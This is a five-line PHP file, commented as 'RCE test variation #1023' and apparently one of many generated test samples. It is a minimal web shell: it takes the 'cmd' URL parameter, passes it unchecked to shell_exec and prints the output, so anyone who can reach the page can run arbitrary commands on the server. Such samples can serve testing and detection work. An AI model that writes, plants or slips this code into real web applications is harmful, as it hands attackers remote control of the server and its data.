<?php
// RCE test variation #1023
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>